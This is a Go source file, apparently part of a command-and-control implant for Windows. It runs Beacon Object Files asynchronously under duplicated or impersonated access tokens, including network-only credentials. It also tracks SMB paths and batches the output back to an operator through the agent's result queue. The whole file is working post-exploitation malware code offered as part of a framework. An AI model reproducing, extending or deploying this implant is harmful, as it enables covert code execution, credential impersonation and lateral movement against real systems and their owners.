// server/docker/payloads/Windows/action_bof_async_windows.go
//go:build windows
// +build windows

package main

import (
	"crypto/rand"
	"encoding/hex"
	"fmt"
	"strings"
	"sync"
	"syscall"
	"time"
)

// Constants for output management - OPTIMIZED VALUES
const (
	MAX_OUTPUT_CHUNK_SIZE = 100 * 1024       // 100KB per chunk (was 20KB)
	MIN_OUTPUT_SIZE       = 50 * 1024        // 50KB minimum before considering send
	FLUSH_INTERVAL        = 30 * time.Second // Force flush every 30 seconds (was 10)
	MIN_SEND_INTERVAL     = 10 * time.Second // Minimum between sends (was 5)
	OUTPUT_CHECK_INTERVAL = 1 * time.Second  // Check for output every 1 second (was 500ms)
	DEBUG_BOF_ASYNC       = true
	MAX_TOTAL_OUTPUT      = 10 * 1024 * 1024 // 10MB max total output
)

// TokenContext stores token information for BOF execution
type TokenContext struct {
	IsImpersonating bool
	ActiveToken     string
	NetOnlyToken    string
	NetOnlyHandle   syscall.Handle
}

// BOFJob represents an async BOF execution job
type BOFJob struct {
	ID              string
	CommandID       string
	CommandDBID     int
	AgentID         string
	Name            string
	Status          string // "running", "completed", "crashed", "killed", "timeout"
	StartTime       time.Time
	EndTime         *time.Time
	Output          strings.Builder
	Error           error
	BOFBytes        []byte
	Args            []byte
	CancelChan      chan bool
	OutputMutex     sync.Mutex
	Command         Command
	ChunkIndex      int
	TotalBytesSent  int
	QueuedChunks    int
	OutputTruncated bool          // Flag if output was truncated
	TokenContext    *TokenContext // Store token context for this job
}

// BOFJobManager manages async BOF jobs
type BOFJobManager struct {
	jobs         map[string]*BOFJob
	mu           sync.RWMutex
	commandQueue *CommandQueue
}

var bofJobManager = &BOFJobManager{
	jobs: make(map[string]*BOFJob),
}

// generateJobID creates a unique job ID
func generateJobID() string {
	b := make([]byte, 8)
	rand.Read(b)
	return hex.EncodeToString(b)
}

// SetCommandQueue sets the command queue reference
func (bjm *BOFJobManager) SetCommandQueue(cq *CommandQueue) {
	bjm.commandQueue = cq
}

// captureCurrentTokenContext captures the current token context for async execution
func captureCurrentTokenContext() *TokenContext {
	if globalTokenStore == nil {
		return nil
	}

	globalTokenStore.mu.RLock()
	defer globalTokenStore.mu.RUnlock()

	return &TokenContext{
		IsImpersonating: globalTokenStore.IsImpersonating,
		ActiveToken:     globalTokenStore.ActiveToken,
		NetOnlyToken:    globalTokenStore.NetOnlyToken,
		NetOnlyHandle:   globalTokenStore.NetOnlyHandle,
	}
}

// applyTokenContextWithDuplication applies the stored token context using token duplication
// This ensures each async BOF gets its own token handle that can be safely managed
func applyTokenContextWithDuplication(tokenContext *TokenContext) (func(), syscall.Handle) {
	if tokenContext == nil || globalTokenStore == nil {
		return func() {}, 0 // No-op cleanup
	}

	var cleanupFunc func()
	var duplicatedToken syscall.Handle

	// Priority: Network-only token > Regular impersonation
	if tokenContext.NetOnlyHandle != 0 {

		// First verify the source handle is still valid
		globalTokenStore.mu.RLock()
		currentNetOnlyHandle := globalTokenStore.NetOnlyHandle
		globalTokenStore.mu.RUnlock()

		if currentNetOnlyHandle == 0 {
			return func() {}, 0
		}

		// Duplicate the token for this specific async operation
		// Use the current handle from global store, not the captured one
		err := DuplicateTokenEx(
			currentNetOnlyHandle,
			TOKEN_ALL_ACCESS,
			nil,
			SecurityImpersonation,
			TokenImpersonation,
			&duplicatedToken,
		)

		if err != nil {

			// Try with different access rights
			err2 := DuplicateTokenEx(
				currentNetOnlyHandle,
				TOKEN_DUPLICATE|TOKEN_IMPERSONATE|TOKEN_QUERY,
				nil,
				SecurityImpersonation,
				TokenImpersonation,
				&duplicatedToken,
			)

			if err2 != nil {
				// As last resort, try to use the original handle directly
				// This is risky but better than nothing
				duplicatedToken = currentNetOnlyHandle
				cleanupFunc = func() {
					// Don't close the original handle
				}
			} else {
				cleanupFunc = func() {
					CloseHandle(duplicatedToken)
				}
			}
		} else {
			cleanupFunc = func() {
				CloseHandle(duplicatedToken)
			}
		}

		return cleanupFunc, duplicatedToken

	} else if tokenContext.IsImpersonating && tokenContext.ActiveToken != "" {
		// Look up the token in the global store
		globalTokenStore.mu.RLock()
		token, exists := globalTokenStore.Tokens[tokenContext.ActiveToken]
		globalTokenStore.mu.RUnlock()

		if exists {

			// Duplicate the token for this specific async operation
			err := DuplicateTokenEx(
				token,
				TOKEN_ALL_ACCESS,
				nil,
				SecurityImpersonation,
				TokenImpersonation,
				&duplicatedToken,
			)

			if err != nil {
				// Fall back to using the original handle
				duplicatedToken = token
				cleanupFunc = func() {
					// Don't close the original handle
				}
			} else {
				cleanupFunc = func() {
					CloseHandle(duplicatedToken)
				}
			}

			return cleanupFunc, duplicatedToken
		}
	}

	return func() {}, 0 // No-op if no impersonation needed
}

// executeBOFAsyncPlatform is the Windows implementation for async BOF
func executeBOFAsyncPlatform(cmd Command, bofBytes []byte, args []byte) CommandResult {
	jobID := generateJobID()

	// Capture current token context before starting the job
	tokenContext := captureCurrentTokenContext()

	job := &BOFJob{
		ID:           jobID,
		CommandID:    cmd.CommandID,
		CommandDBID:  cmd.CommandDBID,
		AgentID:      cmd.AgentID,
		Name:         cmd.Filename,
		Status:       "running",
		StartTime:    time.Now(),
		BOFBytes:     bofBytes,
		Args:         args,
		CancelChan:   make(chan bool, 1),
		Command:      cmd,
		ChunkIndex:   0,
		TokenContext: tokenContext, // Store captured token context
	}

	bofJobManager.mu.Lock()
	bofJobManager.jobs[jobID] = job
	bofJobManager.mu.Unlock()

	// Start BOF in goroutine
	go bofJobManager.executeBOFAsync(job)

	// Return immediate response
	return CommandResult{
		Command:  cmd,
		Output:   fmt.Sprintf("BOF_ASYNC_STARTED|%s|%s", jobID, cmd.Filename),
		ExitCode: 0,
		JobID:    jobID,
	}
}

// executeBOFAsync runs the BOF in a separate goroutine
func (bjm *BOFJobManager) executeBOFAsync(job *BOFJob) {
	defer func() {
		if r := recover(); r != nil {
			job.OutputMutex.Lock()
			job.Status = "crashed"
			job.Error = fmt.Errorf(ErrCtx(E51, fmt.Sprintf("%v", r)))
			endTime := time.Now()
			job.EndTime = &endTime
			crashMsg := "\n" + ErrCtx(E51, fmt.Sprintf("%v", r)) + "\n"
			job.Output.WriteString(crashMsg)

			// Queue final chunk using ResultManager
			bjm.queueOutputChunk(job, job.Output.String(), true)
			job.OutputMutex.Unlock()
		}
	}()

	// Send start notification through ResultManager
	startMsg := fmt.Sprintf("BOF_ASYNC_STARTED|%s|%s", job.ID, job.Name)
	startResult := &CommandResult{
		Command: Command{
			Command:     "bof-async-status",
			CommandID:   job.CommandID,
			CommandDBID: job.CommandDBID,
			AgentID:     job.AgentID,
		},
		Output:      startMsg,
		ExitCode:    0,
		CompletedAt: time.Now().Format(time.RFC3339),
		JobID:       job.ID,
	}
	resultManager.AddResult(startResult)

	// Create channels for coordination
	bofDone := make(chan struct{})
	outputDone := make(chan struct{})

	// Track accumulated data
	lastChunkTime := time.Now()
	accumulatedBytes := 0


	// Log token context
	if job.TokenContext != nil {
		if job.TokenContext.NetOnlyHandle != 0 {
		} else if job.TokenContext.IsImpersonating {
		}
	}

	// Start continuous output monitor
	go func() {
		defer close(outputDone)
		ticker := time.NewTicker(OUTPUT_CHECK_INTERVAL)
		defer ticker.Stop()

		flushTimer := time.NewTicker(FLUSH_INTERVAL)
		defer flushTimer.Stop()

		for {
			select {
			case <-ticker.C:
				// Check global BOF output buffer
				bofOutputMutex.Lock()
				hasOutput := len(bofOutputBuffer) > 0
				var capturedOutput string
				if hasOutput {
					capturedOutput = string(bofOutputBuffer)
					bofOutputBuffer = nil // Clear global buffer
					accumulatedBytes += len(capturedOutput)
				}
				bofOutputMutex.Unlock()

				if hasOutput {
					// Check if we're approaching the output limit
					job.OutputMutex.Lock()

					// Truncate if exceeding max output
					if job.TotalBytesSent+job.Output.Len()+len(capturedOutput) > MAX_TOTAL_OUTPUT {
						if !job.OutputTruncated {
							job.Output.WriteString("\n" + Succ(S19) + "\n")
							job.OutputTruncated = true
						}
						job.OutputMutex.Unlock()
						continue // Skip adding more output
					}

					job.Output.WriteString(capturedOutput)
					currentSize := job.Output.Len()

					// Determine if we should create a chunk
					shouldChunk := false
					timeSinceLastChunk := time.Since(lastChunkTime)

					if currentSize >= MAX_OUTPUT_CHUNK_SIZE {
						shouldChunk = true
					} else if currentSize >= MIN_OUTPUT_SIZE && timeSinceLastChunk >= MIN_SEND_INTERVAL {
						shouldChunk = true
					}

					if shouldChunk && job.Status == "running" {
						chunk := job.Output.String()
						job.Output.Reset()
						job.OutputMutex.Unlock()

						// Queue the chunk through ResultManager
						bjm.queueOutputChunk(job, chunk, false)
						lastChunkTime = time.Now()
						job.TotalBytesSent += len(chunk)
					} else {
						job.OutputMutex.Unlock()
					}
				}

			case <-flushTimer.C:
				// Force flush any accumulated output
				job.OutputMutex.Lock()
				if job.Output.Len() > 0 && job.Status == "running" {
					size := job.Output.Len()
					chunk := job.Output.String()
					job.Output.Reset()
					job.OutputMutex.Unlock()


					// Queue the chunk through ResultManager
					bjm.queueOutputChunk(job, chunk, false)
					lastChunkTime = time.Now()
					job.TotalBytesSent += size
				} else {
					job.OutputMutex.Unlock()
				}

			case <-bofDone:
				// BOF finished

				// Give it a moment for final output
				time.Sleep(500 * time.Millisecond)

				// Final capture from global buffer
				bofOutputMutex.Lock()
				if len(bofOutputBuffer) > 0 {
					finalCapture := string(bofOutputBuffer)
					bofOutputBuffer = nil
					bofOutputMutex.Unlock()

					job.OutputMutex.Lock()
					if job.TotalBytesSent+job.Output.Len()+len(finalCapture) <= MAX_TOTAL_OUTPUT {
						job.Output.WriteString(finalCapture)
					}
					job.OutputMutex.Unlock()

				} else {
					bofOutputMutex.Unlock()
				}
				return
			}
		}
	}()

	// Create result channel for BOF execution
	resultChan := make(chan struct {
		output string
		err    error
	}, 1)

	// Execute BOF in separate goroutine with duplicated token
	go func() {
		defer close(bofDone)

		// Duplicate and apply token context for this BOF execution
		cleanupToken, duplicatedTokenHandle := applyTokenContextWithDuplication(job.TokenContext)
		defer cleanupToken()


		// Clear output buffer before execution
		bofOutputMutex.Lock()
		bofOutputBuffer = nil
		bofOutputMutex.Unlock()

		// If we have a duplicated token, apply impersonation
		if duplicatedTokenHandle != 0 {
			// For network-only tokens, DON'T clear SMB sessions aggressively
			// Only clear if this is the first time accessing this resource
			if job.TokenContext != nil && job.TokenContext.NetOnlyHandle != 0 {
				networkPath := parseBOFNetworkPath(job.Args)
				if networkPath != "" {
					// Only log that we're using network path

					// Track this resource for later cleanup (but don't disconnect now)
					if networkResourceTracker != nil {
						networkResourceTracker.TrackNetworkResource(networkPath)
					}
				}
			}

			// Apply the duplicated token impersonation
			// This needs to happen IMMEDIATELY before LoadWithTimeout
			err := ImpersonateLoggedOnUser(duplicatedTokenHandle)
			if err != nil {
				// Try to continue anyway - the token might still work
			} else {
			}
		}

		// Execute the BOF with async timeout (30 minutes)
		// IMPORTANT: The impersonation must be active during this call
		output, err := LoadWithTimeout(job.BOFBytes, job.Args, 30*time.Minute)

		// Revert impersonation AFTER BOF execution completes
		if duplicatedTokenHandle != 0 {
			RevertToSelf()
		}

		// fmt.Printf("[BOF Async] BOF execution completed for job %s, direct output length: %d\n",
		// 	job.ID, len(output))

		// Send result
		resultChan <- struct {
			output string
			err    error
		}{output, err}
	}()

	// Wait for completion, cancellation, or timeout
	select {
	case result := <-resultChan:
		// Wait for output monitor to finish
		<-outputDone

		job.OutputMutex.Lock()

		// Add any final output
		if result.output != "" {
			existingOutput := job.Output.String()
			if !strings.Contains(existingOutput, result.output) {
				if job.TotalBytesSent+job.Output.Len()+len(result.output) <= MAX_TOTAL_OUTPUT {
					// fmt.Printf("[BOF Async] Adding %d bytes of uncaptured output\n", len(result.output))
					job.Output.WriteString(result.output)
				}
			}
		}

		if result.err != nil {
			job.Status = "crashed"
			job.Error = result.err
			job.Output.WriteString("\n" + Err(E51) + "\n")
		} else {
			job.Status = "completed"
		}

		endTime := time.Now()
		job.EndTime = &endTime
		finalOutput := job.Output.String()
		job.OutputMutex.Unlock()

		// Queue final chunk through ResultManager
		bjm.queueOutputChunk(job, finalOutput, true)


	case <-job.CancelChan:
		close(bofDone)
		<-outputDone

		job.OutputMutex.Lock()
		job.Status = "killed"
		endTime := time.Now()
		job.EndTime = &endTime
		job.Output.WriteString("\n" + Succ(S16) + "\n")
		finalOutput := job.Output.String()
		job.OutputMutex.Unlock()

		// Queue final chunk through ResultManager
		bjm.queueOutputChunk(job, finalOutput, true)

	case <-time.After(30 * time.Minute):
		close(bofDone)
		<-outputDone

		job.OutputMutex.Lock()
		job.Status = "timeout"
		endTime := time.Now()
		job.EndTime = &endTime
		job.Output.WriteString("\n" + Err(E9) + "\n")
		finalOutput := job.Output.String()
		job.OutputMutex.Unlock()

		// Queue final chunk through ResultManager
		bjm.queueOutputChunk(job, finalOutput, true)
	}

}

// queueOutputChunk adds chunks to the regular ResultManager with batching
func (bjm *BOFJobManager) queueOutputChunk(job *BOFJob, output string, isFinal bool) {
	if len(output) == 0 && !isFinal {
		return
	}

	// Split output into chunks if it's too large
	chunks := splitIntoChunks(output, MAX_OUTPUT_CHUNK_SIZE)

	// Batch chunks to reduce database operations
	const BATCH_SIZE = 5
	batchedChunks := make([]string, 0, BATCH_SIZE)

	for i, chunk := range chunks {
		job.ChunkIndex++
		job.QueuedChunks++

		// Determine the status for this chunk
		var status string
		if isFinal && i == len(chunks)-1 {
			switch job.Status {
			case "completed":
				status = "COMPLETED"
			case "crashed":
				status = "CRASHED"
			case "killed":
				status = "KILLED"
			case "timeout":
				status = "TIMEOUT"
			default:
				status = "COMPLETED"
			}
		} else {
			status = "OUTPUT"
		}

		// Create the output message
		outputMessage := fmt.Sprintf("BOF_ASYNC_%s|%s|CHUNK_%d|%s",
			status, job.ID, job.ChunkIndex, chunk)

		batchedChunks = append(batchedChunks, outputMessage)

		// Send batch when full or on last chunk
		if len(batchedChunks) >= BATCH_SIZE || (isFinal && i == len(chunks)-1) {
			// Combine batched chunks into single result
			combinedOutput := strings.Join(batchedChunks, "\n---CHUNK_SEPARATOR---\n")

			result := &CommandResult{
				Command: Command{
					Command:     "bof-async-output",
					CommandID:   job.CommandID,
					CommandDBID: job.CommandDBID,
					AgentID:     job.AgentID,
				},
				Output:      combinedOutput,
				ExitCode:    0,
				CompletedAt: time.Now().Format(time.RFC3339),
				JobID:       job.ID,
			}

			// Add to ResultManager
			if err := resultManager.AddResult(result); err != nil {
			} else {
			}

			// Clear batch
			batchedChunks = batchedChunks[:0]

			// Small delay between batches to prevent overwhelming
			if !isFinal && i < len(chunks)-1 {
				time.Sleep(200 * time.Millisecond)
			}
		}
	}
}

// GetPendingResults returns empty since we use ResultManager now
func (bjm *BOFJobManager) GetPendingResults() []CommandResult {
	return []CommandResult{}
}

// executeBOFJobsList lists all BOF jobs
func executeBOFJobsList() CommandResult {
	jobs := bofJobManager.ListJobs()

	if len(jobs) == 0 {
		return CommandResult{
			Output:      Succ(S0),
			ExitCode:    0,
			CompletedAt: time.Now().Format(time.RFC3339),
		}
	}

	var output strings.Builder
	output.WriteString(Table(TBof, len(jobs)) + "\n")

	for _, job := range jobs {
		job.OutputMutex.Lock()
		duration := time.Since(job.StartTime)
		if job.EndTime != nil {
			duration = job.EndTime.Sub(job.StartTime)
		}

		durationStr := duration.Round(time.Second).String()
		if len(durationStr) > 8 {
			durationStr = duration.Round(time.Second).String()[:8]
		}

		truncated := ""
		if job.OutputTruncated {
			truncated = "YES"
		}

		output.WriteString(fmt.Sprintf("%-24s | %-19s | %-11s | %-8s | %-6d | %s\n",
			job.ID,
			truncateString(job.Name, 19),
			job.Status,
			durationStr,
			job.ChunkIndex,
			truncated))
		job.OutputMutex.Unlock()
	}

	return CommandResult{
		Output:   output.String(),
		ExitCode: 0,
	}
}

func truncateString(s string, maxLen int) string {
	if len(s) <= maxLen {
		return s
	}
	if maxLen > 3 {
		return s[:maxLen-3] + "..."
	}
	return s[:maxLen]
}

// executeBOFGetOutput retrieves output from a BOF job
func executeBOFGetOutput(jobID string) CommandResult {
	var matchedJob *BOFJob
	jobs := bofJobManager.ListJobs()

	for _, job := range jobs {
		if job.ID == jobID || strings.HasPrefix(job.ID, jobID) {
			matchedJob = job
			break
		}
	}

	if matchedJob == nil {
		return CommandResult{
			Output:      ErrCtx(E47, jobID),
			ExitCode:    1,
			CompletedAt: time.Now().Format(time.RFC3339),
		}
	}

	matchedJob.OutputMutex.Lock()
	output := matchedJob.Output.String()
	status := matchedJob.Status
	chunks := matchedJob.ChunkIndex
	truncated := matchedJob.OutputTruncated
	matchedJob.OutputMutex.Unlock()

	truncatedMsg := ""
	if truncated {
		truncatedMsg = " (OUTPUT TRUNCATED - exceeded 10MB limit)"
	}

	if output == "" {
		if status == "running" {
			output = fmt.Sprintf("Job %s is still running\nChunks sent: %d%s",
				matchedJob.ID, chunks, truncatedMsg)
		} else {
			output = fmt.Sprintf("Job %s (%s) has no buffered output\nChunks sent: %d%s",
				matchedJob.ID, status, chunks, truncatedMsg)
		}
	} else {
		output = fmt.Sprintf("Output for job %s (chunks sent: %d)%s:\n%s",
			matchedJob.ID, chunks, truncatedMsg, output)
	}

	return CommandResult{
		Output:   output,
		ExitCode: 0,
		JobID:    jobID,
	}
}

// executeBOFKillJob kills a running BOF job
func executeBOFKillJob(jobID string) CommandResult {
	var matchedJob *BOFJob
	jobs := bofJobManager.ListJobs()

	for _, job := range jobs {
		if job.ID == jobID || strings.HasPrefix(job.ID, jobID) {
			matchedJob = job
			break
		}
	}

	if matchedJob == nil {
		return CommandResult{
			Output:      ErrCtx(E47, jobID),
			ExitCode:    1,
			CompletedAt: time.Now().Format(time.RFC3339),
		}
	}

	if matchedJob.Status != "running" {
		return CommandResult{
			Output:      ErrCtx(E25, matchedJob.Status),
			ExitCode:    1,
			CompletedAt: time.Now().Format(time.RFC3339),
		}
	}

	select {
	case matchedJob.CancelChan <- true:
		time.Sleep(100 * time.Millisecond)
		return CommandResult{
			Output:      SuccCtx(S2, matchedJob.ID),
			ExitCode:    0,
			JobID:       jobID,
			CompletedAt: time.Now().Format(time.RFC3339),
		}
	default:
		return CommandResult{
			Output:      Err(E25),
			ExitCode:    1,
			CompletedAt: time.Now().Format(time.RFC3339),
		}
	}
}

// ListJobs returns all BOF jobs
func (bjm *BOFJobManager) ListJobs() []*BOFJob {
	bjm.mu.RLock()
	defer bjm.mu.RUnlock()

	jobs := make([]*BOFJob, 0, len(bjm.jobs))
	for _, job := range bjm.jobs {
		jobs = append(jobs, job)
	}
	return jobs
}

// CleanupOldJobs removes old completed jobs
func (bjm *BOFJobManager) CleanupOldJobs(maxAge time.Duration) {
	bjm.mu.Lock()
	defer bjm.mu.Unlock()

	now := time.Now()
	for id, job := range bjm.jobs {
		if job.Status != "running" && job.EndTime != nil {
			if now.Sub(*job.EndTime) > maxAge {
				delete(bjm.jobs, id)
			}
		}
	}
}

// GetJob retrieves a specific job
func (bjm *BOFJobManager) GetJob(jobID string) (*BOFJob, bool) {
	bjm.mu.RLock()
	defer bjm.mu.RUnlock()

	job, exists := bjm.jobs[jobID]
	return job, exists
}

// Initialize cleanup routine
func init() {
	go func() {
		ticker := time.NewTicker(1 * time.Hour)
		defer ticker.Stop()

		for range ticker.C {
			bofJobManager.CleanupOldJobs(24 * time.Hour)
		}
	}()
}
